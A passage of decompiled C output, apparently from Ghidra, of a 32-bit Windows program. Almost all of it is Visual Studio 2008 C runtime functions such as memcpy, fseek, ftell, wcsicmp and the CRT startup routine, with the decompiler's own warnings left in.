            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_004106fc_caseD_2;
          case 3:
            goto switchD_004106fc_caseD_3;
          }
          goto switchD_004106fc_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_004106fc_caseD_1:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_004106fc_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_004106fc_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_004106fc_caseD_0:
  return _Dst;
}



// Library Function - Single Match
//  _wcsrchr
// 
// Library: Visual Studio 2008 Release

wchar_t * __cdecl _wcsrchr(wchar_t *_Str,wchar_t _Ch)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  
  pwVar2 = _Str;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  do {
    pwVar2 = pwVar2 + -1;
    if (pwVar2 == _Str) break;
  } while (*pwVar2 != _Ch);
  if (*pwVar2 != _Ch) {
    pwVar2 = (wchar_t *)0x0;
  }
  return pwVar2;
}



void __cdecl FUN_00410a31(ulong param_1)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  p_Var1->_holdrand = param_1;
  return;
}



// Library Function - Single Match
//  _rand
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release, Visual Studio 2008 Release

int __cdecl _rand(void)

{
  _ptiddata p_Var1;
  uint uVar2;
  
  p_Var1 = __getptd();
  uVar2 = p_Var1->_holdrand * 0x343fd + 0x269ec3;
  p_Var1->_holdrand = uVar2;
  return uVar2 >> 0x10 & 0x7fff;
}



// Library Function - Single Match
//  __fseek_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __fseek_nolock(FILE *_File,long _Offset,int _Origin)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  long lVar4;
  
  if ((_File->_flag & 0x83U) == 0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    iVar3 = -1;
  }
  else {
    _File->_flag = _File->_flag & 0xffffffef;
    if (_Origin == 1) {
      lVar4 = __ftell_nolock(_File);
      _Offset = _Offset + lVar4;
      _Origin = 0;
    }
    __flush(_File);
    uVar1 = _File->_flag;
    if ((char)uVar1 < '\0') {
      _File->_flag = uVar1 & 0xfffffffc;
    }
    else if ((((uVar1 & 1) != 0) && ((uVar1 & 8) != 0)) && ((uVar1 & 0x400) == 0)) {
      _File->_bufsiz = 0x200;
    }
    iVar3 = __fileno(_File);
    lVar4 = __lseek(iVar3,_Offset,_Origin);
    iVar3 = (lVar4 != -1) - 1;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fseek
// 
// Library: Visual Studio 2008 Release

int __cdecl _fseek(FILE *_File,long _Offset,int _Origin)

{
  int *piVar1;
  int iVar2;
  
  if ((_File == (FILE *)0x0) || (((_Origin != 0 && (_Origin != 1)) && (_Origin != 2)))) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else {
    __lock_file(_File);
    iVar2 = __fseek_nolock(_File,_Offset,_Origin);
    FUN_00410b6a();
  }
  return iVar2;
}



void FUN_00410b6a(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __ftell_nolock
// 
// Library: Visual Studio 2008 Release

long __cdecl __ftell_nolock(FILE *_File)

{
  uint uVar1;
  char *pcVar2;
  int *piVar3;
  uint _FileHandle;
  FILE *pFVar4;
  long lVar5;
  char *pcVar6;
  FILE *pFVar7;
  char *pcVar8;
  int iVar9;
  bool bVar10;
  int local_10;
  int local_c;
  
  pFVar7 = _File;
  if (_File == (FILE *)0x0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  _FileHandle = __fileno(_File);
  if (_File->_cnt < 0) {
    _File->_cnt = 0;
  }
  local_c = __lseek(_FileHandle,0,1);
  if (local_c < 0) {
    return -1;
  }
  uVar1 = _File->_flag;
  if ((uVar1 & 0x108) == 0) {
    return local_c - _File->_cnt;
  }
  pcVar6 = _File->_ptr;
  pcVar8 = _File->_base;
  local_10 = (int)pcVar6 - (int)pcVar8;
  if ((uVar1 & 3) == 0) {
    if (-1 < (char)uVar1) {
      piVar3 = __errno();
      *piVar3 = 0x16;
      return -1;
    }
  }
  else {
    pcVar2 = pcVar8;
    if ((*(byte *)((&DAT_0046eb40)[(int)_FileHandle >> 5] + 4 + (_FileHandle & 0x1f) * 0x40) & 0x80)
        != 0) {
      for (; pcVar2 < pcVar6; pcVar2 = pcVar2 + 1) {
        if (*pcVar2 == '\n') {
          local_10 = local_10 + 1;
        }
      }
    }
  }
  if (local_c != 0) {
    if ((*(byte *)&_File->_flag & 1) != 0) {
      if (_File->_cnt == 0) {
        local_10 = 0;
      }
      else {
        pFVar4 = (FILE *)(pcVar6 + (_File->_cnt - (int)pcVar8));
        iVar9 = (_FileHandle & 0x1f) * 0x40;
        if ((*(byte *)((&DAT_0046eb40)[(int)_FileHandle >> 5] + 4 + iVar9) & 0x80) != 0) {
          lVar5 = __lseek(_FileHandle,0,2);
          if (lVar5 == local_c) {
            pcVar6 = _File->_base;
            pcVar8 = pcVar6 + (int)&pFVar4->_ptr;
            _File = pFVar4;
            for (; pcVar6 < pcVar8; pcVar6 = pcVar6 + 1) {
              if (*pcVar6 == '\n') {
                _File = (FILE *)((int)&_File->_ptr + 1);
              }
            }
            bVar10 = (pFVar7->_flag & 0x2000U) == 0;
          }
          else {
            lVar5 = __lseek(_FileHandle,local_c,0);
            if (lVar5 < 0) {
              return -1;
            }
            pFVar7 = (FILE *)0x200;
            if ((((FILE *)0x200 < pFVar4) || ((_File->_flag & 8U) == 0)) ||
               ((_File->_flag & 0x400U) != 0)) {
              pFVar7 = (FILE *)_File->_bufsiz;
            }
            bVar10 = (*(byte *)((&DAT_0046eb40)[(int)_FileHandle >> 5] + 4 + iVar9) & 4) == 0;
            _File = pFVar7;
          }
          pFVar4 = _File;
          if (!bVar10) {
            pFVar4 = (FILE *)((int)&_File->_ptr + 1);
          }
        }
        _File = pFVar4;
        local_c = local_c - (int)_File;
      }
    }
    return local_10 + local_c;
  }
  return local_10;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _ftell
// 
// Library: Visual Studio 2008 Release

long __cdecl _ftell(FILE *_File)

{
  int *piVar1;
  long lVar2;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    lVar2 = -1;
  }
  else {
    __lock_file(_File);
    lVar2 = __ftell_nolock(_File);
    FUN_00410d75();
  }
  return lVar2;
}



void FUN_00410d75(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



void FUN_00410d7f(uint param_1)

{
  operator_new(param_1);
  return;
}



// Library Function - Single Match
//  public: virtual __thiscall type_info::~type_info(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall type_info::~type_info(type_info *this)

{
  *(undefined ***)this = vftable;
  _Type_info_dtor(this);
  return;
}



// Library Function - Single Match
//  public: virtual void * __thiscall type_info::`scalar deleting destructor'(unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void * __thiscall type_info::_scalar_deleting_destructor_(type_info *this,uint param_1)

{
  ~type_info(this);
  if ((param_1 & 1) != 0) {
    FUN_0040fb79(this);
  }
  return this;
}



// Library Function - Single Match
//  public: bool __thiscall type_info::operator==(class type_info const &)const 
// 
// Library: Visual Studio 2008 Release

bool __thiscall type_info::operator==(type_info *this,type_info *param_1)

{
  int iVar1;
  
  iVar1 = _strcmp((char *)(param_1 + 9),(char *)(this + 9));
  return (bool)('\x01' - (iVar1 != 0));
}



void FUN_00410ddb(void *param_1)

{
  FUN_0040fb79(param_1);
  return;
}



// Library Function - Single Match
//  public: __thiscall _LocaleUpdate::_LocaleUpdate(struct localeinfo_struct *)
// 
// Library: Visual Studio 2008 Release

_LocaleUpdate * __thiscall
_LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this,localeinfo_struct *param_1)

{
  uint *puVar1;
  _ptiddata p_Var2;
  pthreadlocinfo ptVar3;
  pthreadmbcinfo ptVar4;
  
  this[0xc] = (_LocaleUpdate)0x0;
  if (param_1 == (localeinfo_struct *)0x0) {
    p_Var2 = __getptd();
    *(_ptiddata *)(this + 8) = p_Var2;
    *(pthreadlocinfo *)this = p_Var2->ptlocinfo;
    *(pthreadmbcinfo *)(this + 4) = p_Var2->ptmbcinfo;
    if ((*(undefined **)this != PTR_DAT_0042bde8) && ((p_Var2->_ownlocale & DAT_0042bd04) == 0)) {
      ptVar3 = ___updatetlocinfo();
      *(pthreadlocinfo *)this = ptVar3;
    }
    if ((*(undefined **)(this + 4) != PTR_DAT_0042bc08) &&
       ((*(uint *)(*(int *)(this + 8) + 0x70) & DAT_0042bd04) == 0)) {
      ptVar4 = ___updatetmbcinfo();
      *(pthreadmbcinfo *)(this + 4) = ptVar4;
    }
    if ((*(byte *)(*(int *)(this + 8) + 0x70) & 2) == 0) {
      puVar1 = (uint *)(*(int *)(this + 8) + 0x70);
      *puVar1 = *puVar1 | 2;
      this[0xc] = (_LocaleUpdate)0x1;
    }
  }
  else {
    *(pthreadlocinfo *)this = param_1->locinfo;
    *(pthreadmbcinfo *)(this + 4) = param_1->mbcinfo;
  }
  return this;
}



// Library Function - Single Match
//  __wcsicmp_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __wcsicmp_l(wchar_t *_Str1,wchar_t *_Str2,_locale_t _Locale)

{
  wchar_t wVar1;
  wchar_t wVar2;
  wint_t wVar3;
  wint_t wVar4;
  int *piVar5;
  int iVar6;
  uint uVar7;
  uint uVar8;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if (_Str1 == (wchar_t *)0x0) {
    piVar5 = __errno();
    *piVar5 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    iVar6 = 0x7fffffff;
  }
  else if (_Str2 == (wchar_t *)0x0) {
    piVar5 = __errno();
    *piVar5 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    iVar6 = 0x7fffffff;
  }
  else {
    if ((local_14.locinfo)->lc_category[0].wlocale == (wchar_t *)0x0) {
      do {
        wVar1 = *_Str1;
        if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
          wVar1 = wVar1 + L' ';
        }
        uVar8 = (uint)(ushort)wVar1;
        wVar2 = *_Str2;
        if ((0x40 < (ushort)wVar2) && ((ushort)wVar2 < 0x5b)) {
          wVar2 = wVar2 + L' ';
        }
        _Str1 = _Str1 + 1;
        _Str2 = _Str2 + 1;
        uVar7 = (uint)(ushort)wVar2;
      } while ((wVar1 != L'\0') && (wVar1 == wVar2));
    }
    else {
      do {
        wVar3 = __towlower_l(*_Str1,&local_14);
        uVar8 = (uint)wVar3;
        _Str1 = _Str1 + 1;
        wVar4 = __towlower_l(*_Str2,&local_14);
        _Str2 = _Str2 + 1;
        uVar7 = (uint)wVar4;
        if (wVar3 == 0) break;
      } while (wVar3 == wVar4);
    }
    iVar6 = uVar8 - uVar7;
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  return iVar6;
}



// Library Function - Single Match
//  __wcsicmp
// 
// Library: Visual Studio 2008 Release

int __cdecl __wcsicmp(wchar_t *_Str1,wchar_t *_Str2)

{
  wchar_t wVar1;
  wchar_t wVar2;
  int *piVar3;
  int iVar4;
  
  if (DAT_0042d8b8 == 0) {
    if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
      piVar3 = __errno();
      *piVar3 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      iVar4 = 0x7fffffff;
    }
    else {
      do {
        wVar1 = *_Str1;
        if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
          wVar1 = wVar1 + L' ';
        }
        wVar2 = *_Str2;
        if ((0x40 < (ushort)wVar2) && ((ushort)wVar2 < 0x5b)) {
          wVar2 = wVar2 + L' ';
        }
        _Str1 = _Str1 + 1;
        _Str2 = _Str2 + 1;
      } while ((wVar1 != L'\0') && (wVar1 == wVar2));
      iVar4 = (uint)(ushort)wVar1 - (uint)(ushort)wVar2;
    }
  }
  else {
    iVar4 = __wcsicmp_l(_Str1,_Str2,(_locale_t)0x0);
  }
  return iVar4;
}



// Library Function - Single Match
//  _memcpy_s
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

errno_t __cdecl _memcpy_s(void *_Dst,rsize_t _DstSize,void *_Src,rsize_t _MaxCount)

{
  errno_t eVar1;
  int *piVar2;
  
  if (_MaxCount == 0) {
LAB_00411021:
    eVar1 = 0;
  }
  else {
    if (_Dst == (void *)0x0) {
LAB_0041102a:
      piVar2 = __errno();
      eVar1 = 0x16;
      *piVar2 = 0x16;
    }
    else {
      if ((_Src != (void *)0x0) && (_MaxCount <= _DstSize)) {
        _memcpy(_Dst,_Src,_MaxCount);
        goto LAB_00411021;
      }
      _memset(_Dst,0,_DstSize);
      if (_Src == (void *)0x0) goto LAB_0041102a;
      if (_MaxCount <= _DstSize) {
        return 0x16;
      }
      piVar2 = __errno();
      eVar1 = 0x22;
      *piVar2 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return eVar1;
}



// Library Function - Single Match
//  _memmove_s
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

errno_t __cdecl _memmove_s(void *_Dst,rsize_t _DstSize,void *_Src,rsize_t _MaxCount)

{
  int *piVar1;
  errno_t eVar2;
  
  if (_MaxCount == 0) {
LAB_004110e5:
    eVar2 = 0;
  }
  else {
    if ((_Dst == (void *)0x0) || (_Src == (void *)0x0)) {
      piVar1 = __errno();
      eVar2 = 0x16;
      *piVar1 = 0x16;
    }
    else {
      if (_MaxCount <= _DstSize) {
        _memmove(_Dst,_Src,_MaxCount);
        goto LAB_004110e5;
      }
      piVar1 = __errno();
      eVar2 = 0x22;
      *piVar1 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return eVar2;
}



// Library Function - Single Match
//  _calloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl _calloc(size_t _Count,size_t _Size)

{
  int *piVar1;
  int *piVar2;
  int local_8;
  
  local_8 = 0;
  piVar1 = __calloc_impl(_Count,_Size,&local_8);
  if ((piVar1 == (int *)0x0) && (local_8 != 0)) {
    piVar2 = __errno();
    if (piVar2 != (int *)0x0) {
      piVar2 = __errno();
      *piVar2 = local_8;
    }
  }
  return piVar1;
}



// Library Function - Single Match
//  public: __thiscall std::bad_alloc::bad_alloc(void)
// 
// Library: Visual Studio 2008 Release

bad_alloc * __thiscall std::bad_alloc::bad_alloc(bad_alloc *this)

{
  exception::exception((exception *)this,&PTR_s_bad_allocation_0042b04c,1);
  *(undefined ***)this = vftable;
  return this;
}



undefined4 * __thiscall FUN_00411151(void *this,byte param_1)

{
  *(undefined ***)this = std::bad_alloc::vftable;
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040fb79(this);
  }
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_00411178(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::bad_alloc::vftable;
  return (undefined4 *)this;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  void * __cdecl operator new(unsigned int)
// 
// Library: Visual Studio 2008 Release

void * __cdecl operator_new(uint param_1)

{
  code *pcVar1;
  int iVar2;
  void *pvVar3;
  undefined local_10 [12];
  
  do {
    pvVar3 = _malloc(param_1);
    if (pvVar3 != (void *)0x0) {
      return pvVar3;
    }
    iVar2 = __callnewh(param_1);
  } while (iVar2 != 0);
  if ((_DAT_0042d08c & 1) == 0) {
    _DAT_0042d08c = _DAT_0042d08c | 1;
    std::bad_alloc::bad_alloc((bad_alloc *)&DAT_0042d080);
    _atexit((_func_4879 *)&LAB_00422120);
  }
  FUN_00411178(local_10,(exception *)&DAT_0042d080);
  __CxxThrowException_8(local_10,&DAT_0042919c);
  pcVar1 = (code *)swi(3);
  pvVar3 = (void *)(*pcVar1)();
  return pvVar3;
}



// Library Function - Single Match
//  _fast_error_exit
// 
// Library: Visual Studio 2008 Release

void __cdecl _fast_error_exit(int param_1)

{
  if (DAT_0042d098 == 1) {
    __FF_MSGBANNER();
  }
  __NMSG_WRITE(param_1);
  ___crtExitProcess(0xff);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x004113b4)
// Library Function - Single Match
//  ___tmainCRTStartup
// 
// Library: Visual Studio 2008 Release

int ___tmainCRTStartup(void)

{
  int iVar1;
  _STARTUPINFOW local_6c;
  int local_24;
  int local_20;
  undefined4 uStack_c;
  undefined4 local_8;
  
  uStack_c = 0x411359;
  local_8 = 0;
  GetStartupInfoW(&local_6c);
  local_8 = 0xfffffffe;
  local_20 = 0;
  iVar1 = __heap_init();
  if (iVar1 == 0) {
    _fast_error_exit(0x1c);
  }
  iVar1 = __mtinit();
  if (iVar1 == 0) {
    _fast_error_exit(0x10);
  }
  __RTC_Initialize();
  local_8 = 1;
  iVar1 = __ioinit();
  if (iVar1 < 0) {
    __amsg_exit(0x1b);
  }
  DAT_0046fc98 = GetCommandLineW();
  DAT_0042d094 = ___crtGetEnvironmentStringsW();
  iVar1 = __wsetargv();
  if (iVar1 < 0) {
    __amsg_exit(8);
  }
  iVar1 = __wsetenvp();
  if (iVar1 < 0) {
    __amsg_exit(9);
  }
  iVar1 = __cinit(1);
  if (iVar1 != 0) {
    __amsg_exit(iVar1);
  }
  __wwincmdln();
  local_24 = FUN_00401110(0x400000);
  if (local_20 == 0) {
                    // WARNING: Subroutine does not return
    _exit(local_24);
  }
  __cexit();
  return local_24;
}



void entry(void)

{
  ___security_init_cookie();
  ___tmainCRTStartup();
  return;
}



// Library Function - Single Match
//  _memcpy
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_004116c3_caseD_2;
        case 3:
          goto switchD_004116c3_caseD_3;
        }
        goto switchD_004116c3_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_004116c3_caseD_0;
      case 1:
        goto switchD_004116c3_caseD_1;
      case 2:
        goto switchD_004116c3_caseD_2;
      case 3:
        goto switchD_004116c3_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_004116c3_caseD_2;
            case 3:
              goto switchD_004116c3_caseD_3;
            }
            goto switchD_004116c3_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_004116c3_caseD_2;
            case 3:
              goto switchD_004116c3_caseD_3;
            }
            goto switchD_004116c3_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_004116c3_caseD_2;
            case 3:
              goto switchD_004116c3_caseD_3;
            }
            goto switchD_004116c3_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_004116c3_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_004116c3_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_004116c3_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_004116c3_caseD_0:
    return _Dst;
  }
  if (((0xff < _Size) && (DAT_0046ec40 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = __VEC_memcpy((undefined4 *)_Dst,(undefined4 *)_Src,_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_0041153c_caseD_2;
      case 3:
        goto switchD_0041153c_caseD_3;
      }
      goto switchD_0041153c_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_0041153c_caseD_0;
    case 1:
      goto switchD_0041153c_caseD_1;
    case 2:
      goto switchD_0041153c_caseD_2;
    case 3:
      goto switchD_0041153c_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0041153c_caseD_2;
          case 3:
            goto switchD_0041153c_caseD_3;
          }
          goto switchD_0041153c_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0041153c_caseD_2;
          case 3:
            goto switchD_0041153c_caseD_3;
          }
          goto switchD_0041153c_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0041153c_caseD_2;
          case 3:
            goto switchD_0041153c_caseD_3;
          }
          goto switchD_0041153c_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
